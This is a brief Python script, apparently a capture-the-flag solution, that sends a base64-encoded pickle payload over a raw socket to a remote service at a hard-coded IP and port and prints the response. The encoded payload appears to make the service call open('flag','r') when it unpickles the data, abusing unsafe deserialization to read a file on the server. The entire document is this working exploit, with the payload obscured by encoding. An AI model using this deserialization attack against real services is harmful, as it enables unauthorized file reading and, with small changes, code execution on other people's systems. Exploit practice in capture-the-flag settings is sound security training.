import socket, base64

payload_b64 = "gASVHwAAAAAAAACMA19pb5SMBG9wZW6Uk5SMBGZsYWeUjAFylIaUUpQu"
payload = base64.b64decode(payload_b64)

s = socket.socket()
s.connect(("13.71.17.243", 9045))
s.sendall(payload)

print(s.recv(4096).decode())
s.close()
